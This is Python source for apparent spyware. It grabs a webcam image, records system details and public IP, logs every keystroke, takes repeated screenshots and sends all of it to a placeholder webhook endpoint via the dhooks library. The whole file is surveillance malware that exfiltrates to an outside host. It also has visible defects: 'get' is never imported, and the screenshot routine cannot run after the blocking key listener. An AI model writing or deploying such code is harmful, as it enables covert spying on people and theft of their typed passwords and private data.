import socket
import platform
import logging
from pynput.keyboard import Key, Listener
from pynput import keyboard
import pynput
import time
import os
import datetime
import pygame
import pygame.camera
from dhooks import Webhook
import pyautogui


system_info = "systeminfo.txt"
file_path = "/home/kali" # Change this
extend = "/"  # For windows this should be "\\"
file_merge = file_path + extend


def main():
    log_send = Webhook('your_webhook_api') # Add your webhook api
    def webcamera():
        pygame.camera.init()
        camlist = pygame.camera.list_cameras()

        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            log_send.send(image)

        else:
            print("No camera on current device")

    webcamera()

    def system_information():
        with open(file_merge + system_info, "w") as f:
            hostname = socket.gethostname()
            ipaddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + '\n')
            except Exception:
                f.write("Couldn't get Public IP Address (May be due to max query) \n")

            f.write("Processor Info: " + platform.processor() + '\n')
            f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + ipaddr + '\n')

    system_information()

    def on_press(key):
        log_send.send(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()

    def screenshots():

        for x in range(0, 10):
            img = pyautogui.screenshot()
            time.sleep(5)
            log_send.send(img)

    screenshots()


if __name__ == '__main__':

    while True:
        try:
            main()

        except KeyboardInterrupt:
            print()
